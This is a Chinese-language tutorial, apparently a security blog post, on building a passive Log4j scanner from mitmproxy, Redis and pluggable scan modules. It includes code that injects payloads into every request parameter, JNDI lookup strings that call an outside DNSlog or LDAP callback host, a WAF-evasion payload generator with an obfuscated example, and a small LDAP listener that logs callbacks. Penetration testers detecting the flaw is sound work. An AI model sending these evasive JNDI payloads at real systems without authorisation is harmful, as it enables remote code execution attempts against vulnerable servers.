# 从零构建Log4j被动扫描器

# 为什么是被动扫描器
Log4j这个漏洞比较特殊,有一点类似之前fastjson的漏洞,除了少数几个java产品(如Apache solr,VCenter),没有固定的漏洞触发URL,所以扫描Log4j的漏洞有以下两种方式

+ 通过Http Headers中的字段添加Payload进行测试
+ 渗透测试人员手工在页面或者BP中输入payload进行测试

第一种方式本身成功率不高,第二种方式成功率很高,但是工作量又太大了,而被动扫描器就是为了解决第二种方式中工作量大的问题.

被动扫描器并不是一个新的概念,业界也已经有了多个优秀的被动扫描器.例如原生支持被动扫描的xray,通过BP插件方式实现被动扫描的多个工具等



# 被动扫描器原理
被动扫描器运行时相关的几个节点关系如下图.

![1640757454705-0f3bf3d6-0f1e-4e29-91a5-d15863abf7c9.webp](./img/MIbNu9Xe1OUSRs81/1640757454705-0f3bf3d6-0f1e-4e29-91a5-d15863abf7c9-415979.webp)

## 运行逻辑
+ 渗透测试人员浏览器通过http代理访问目标网站
+ http代理获取到http request及http response
+ http代理将http request及http response的具体内容转发到被动扫描器消息队列
+ 被动扫描器消息队列接收到数据包后,调用配置好的扫描模块
+ 扫描模块代码中将http request的对应内容(如header,param,json等)替换为payload
+ 扫描模块再次发送更改后的request



## 实现效果
渗透测试人员在配置好被动扫描器和浏览器代理后,只需要正常浏览目标网站,使用常见功能(如登录,更改用户配置等),被动扫描器会自动针对每一个http请求进行测试.



# 被动扫描器实现
### 获取Http request及Http response
我们业界非常成熟的工具mitmproxy来实现此功能.

mitmproxy支持加载自定义插件,更方便我们实现自定义功能.mitmproxy插件的核心代码:

```python

    def request(self, flow: http.HTTPFlow) -> None:
        pass

    def response(self, flow: http.HTTPFlow):
        if flow.request.stream:
            return
        request = {
            "content": self.decode(flow.request.content),
            "headers": dict(flow.request.headers),
            "host": flow.request.host,
            "host_header": flow.request.host_header,
            "http_version": flow.request.http_version,
            "method": flow.request.method,
            "multipart_form": dict(flow.request.multipart_form),
            "path": flow.request.path,
            "path_components": flow.request.path_components,
            "port": flow.request.port,
            "pretty_host": flow.request.pretty_host,
            "pretty_url": flow.request.pretty_url,
            "query": dict(flow.request.query),
            "raw_content": self.decode(flow.request.raw_content),
            "scheme": flow.request.scheme,
            "stream": flow.request.stream,
            "text": flow.request.text,
            "timestamp_end": flow.request.timestamp_end,
            "timestamp_start": flow.request.timestamp_start,
            "url": flow.request.url,
            "urlencoded_form": dict(flow.request.urlencoded_form),
        }
        response = {
            "content": self.decode(flow.response.content),
            "headers": dict(flow.response.headers),
            "http_version": flow.response.http_version,
            "raw_content": self.decode(flow.request.raw_content),
            "status_code": flow.response.status_code,
            "text": flow.response.text,
            "timestamp_end": flow.response.timestamp_end,
            "timestamp_start": flow.response.timestamp_start,
        }
```

+ 通过mitmproxy的API,插件可以获取到request和response的所有信息,并且格式化存储,方便后续处理.
+ mitmproxy插件并没有针对请求进行任何更改,所以用户通过代理访问目标网站不会受到影响.

### Http request及Http response发送到被动扫描器
为了实现模块化及流水线处理,Http request及Http response将以json格式发送到被动扫描器的消息队列,核心代码如下:

```python
class RedisClient(object):

    def __init__(self):
        try:
            self.rcon = redis.Redis.from_url(url=f"{get_redis_url()}5")
        except Exception as E:
            self.rcon = None
            ctx.log.error(E)

    def publish_data(self, data):
        if self.rcon is None:
            try:
                self.rcon = redis.Redis.from_url(url=f"{get_redis_url()}5")
            except Exception as E:
                self.rcon = None
                ctx.log.error(E)
        try:
            data = json.dumps(data)
            result = self.rcon.publish(VIPER_PROXY_HTTP_SCAN_DATA, data)
        except Exception as E:
            ctx.log.error(E)
            self.rcon = None
            self.rcon = None
            
class ProxyScanAddon(object):     
    def response(self, flow: http.HTTPFlow):
		...
        ...
        self.rcon.publish_data({"request": request, "response": response})
```

+ 消息队列通过Redis的订阅/推送功能实现
+ 通过预先配置好的订阅地址及Redis网络连接,订阅/推送还实现了跨进程(mitmproxy/被动扫描器)消息通讯



### 被动扫描器接收消息并调用扫描模块
+ 消息接收部分代码

```python
    @staticmethod
    def sub_proxy_http_scan_thread():
        """这个函数必须以线程的方式运行,监控外部rpc发送的redis消息,获取任务结果"""
        rcon = RedisClient.get_result_connection()
        if rcon is None:
            return
        ps = rcon.pubsub(ignore_subscribe_messages=True)
        ps.subscribe(**{VIPER_PROXY_HTTP_SCAN_DATA: ProxyHttpScan.store_request_response_from_sub})
        for message in ps.listen():
            if message:
                logger.warning(f"不应获取非空message {message}")
```

+ 调用扫描模块部分代码

```python
@staticmethod
    def store_request_response_from_sub(message=None):
        # 获取数据
        body = message.get('data')
        try:
            data_dict = json.loads(body)
            request_data = data_dict.get("request")
            response_data = data_dict.get("response")
            data = data_dict.get("data")
        except Exception as E:
            logger.exception(E)
            return False
		# 配置开关
        conf = Xcache.get_proxy_http_scan_conf()
        if conf.get("flag") is not True:
            return
		
        # 实例化模块
        proxy_http_scan_dict = Xcache.get_proxy_http_scan_dict()
        for module_uuid in proxy_http_scan_dict:
            one_result = proxy_http_scan_dict.get(module_uuid)
            loadpath = one_result.get("loadpath")
            try:
                class_intent = importlib.import_module(loadpath)
                module_intent = class_intent.PostModule(custom_param=json.loads(one_result.get("custom_param")))
            except Exception as E:
                logger.exception(E)
                continue
			
             # 调用模块
            try:
                module_intent.callback(request=ProxyRequest(request_data), response=ProxyResponse(response_data),
                                       data=data)
            except Exception as E:
                logger.exception(E)
                continue
```

### 扫描模块代码
+ 扫描模块根据request的类型(GET/POST Form/POST JSON)替换对应参数为payload,然后再次发送http请求

```python
        if request.method == "GET":
            if request.query:
				...
                for payload in payloads:
                    for key in request.query:
                        request.query[key] = payload
                    result = request.send()
        elif request.method == "POST":
            if request.urlencoded_form:

				...

                for payload in payloads:
                    for key in request.urlencoded_form:
                        request.urlencoded_form[key] = payload
                    result = request.send()
            else:
                if is_json(request.text):
					...
                    for payload in payloads:
                        old_dict = json.loads(request.text)
                        new_dict = JsonReplace().replace_inter(old_dict, payload)
                        request.text = json.dumps(new_dict)
                        result = request.send()
```

#### Log4j绕过WAF的Payload
传统的Log4j的Payload特征非常明显,例如如下payload

```python
${jndi:ldap://uuid.XXXX.ceye.io/hello}
```

通过{::-n}实现绕过WAF的payload

```python
${${VQ:f:-j}${68:E0:4:-n}${UiL:Iw:QuF:-d}${tI:nA:dol:-i}${vJ2:DKz:-:}${x:S5r:-l}${D:-d}${VNA:xs:rv:-a}${Y:-p}${8x:Z0z:-:}${b:V:-/}${Kki:Qn:1:-/}${x:l:-e}${Qm:ka:-e}${sL:4P8:-e}${Qqx:B:-d}${e:-d}${Qxm:r:LlI:-1}${UYv:-1}${9m:-c}${H:8P:-6}${r:I4:OC:-8}${o0:-7}${Ej:-1}${JX:9M:5F:-1}${sY:-1}${07n:owb:e:-e}${z:I:-c}${jH:nYU:s:-.}${r:RbP:j:-X}${lW:hcL:-X}${gPt:w:-X}${n:ZB0:3G:-.}${Fe:-c}${jfL:6b:sdn:-e}${N2:j:D:-y}${znQ:-e}${Di:-.}${N:d:-i}${sk:uf:-o}${4:pcl:-/}${Jb:Vf:-h}${ugL:-i}}
```

具体代码

```python
    def bypass_waf_payload(self, raw_payload):
        new_payload = ""
        for one_raw in raw_payload:
            one_format = ""
            for i in range(random_int(3)):
                one_format = f"{one_format}{random_str(random_int(3))}:"
            one_new = f"${{{one_format}-{one_raw}}}"
            new_payload = f"{new_payload}{one_new}"
        return new_payload
```

#### DNSLog与LDAP协议
在测试互联网应用时DNSlog是非常好用的,如果需要测试公司内网的应用,使用LDAP协议无疑是更加稳定好用的选择.

LDAP的payload采用如下格式:

${jndi:ldap://LDAPIP:PORT/uuid}

其中uuid可以用来判断具体请求的来源

搭建LDAPServer的代码如下:

```python
class LDAPHandler(socketserver.BaseRequestHandler):
    """
    Malicious query handler.
    """

    def __init__(self, ):
        pass

    def __call__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def handle(self):
        handshake = self.request.recv(8096)
        self.request.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")
        time.sleep(0.5)
        query = self.request.recv(8096)
        if len(query) < 10:
            return
        query_name = query[9:9 + query[8:][0]].decode()
        print(f"IP: {self.request.getpeername()[0]}  UUID: {query_name}")
        self.request.close()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="All-In-One Log4JRCE by alexandre-lavoie")
    parser.add_argument("--ldap_port", "-p", help="The local port to run the LDAP server.", type=int, default=1387)
    args = parser.parse_args()
    socketserver.TCPServer.allow_reuse_address = True
    print(f"Run LDAP Server on port : {args.ldap_port}")
    with socketserver.TCPServer(("0.0.0.0", args.ldap_port), LDAPHandler()) as server:
        server.serve_forever()
```

每次LDAPServer接收到请求,都会打印来源IP及对应的uuid



# 集成所有功能
对于一个好的安全工具,功能是其主体,友好的UI,方便的部署方式也是不可或缺的.作者将被动扫描器的功能以模块的方式集成到Viper中,最终效果截图:

![1640760993754-1f7c97a5-d484-4695-b89c-01e39c2bd00e.webp](./img/MIbNu9Xe1OUSRs81/1640760993754-1f7c97a5-d484-4695-b89c-01e39c2bd00e-532644.webp)

![1640761017423-e0ea648f-90a0-43b9-9ba3-c68bf77aa085.webp](./img/MIbNu9Xe1OUSRs81/1640761017423-e0ea648f-90a0-43b9-9ba3-c68bf77aa085-916896.webp)





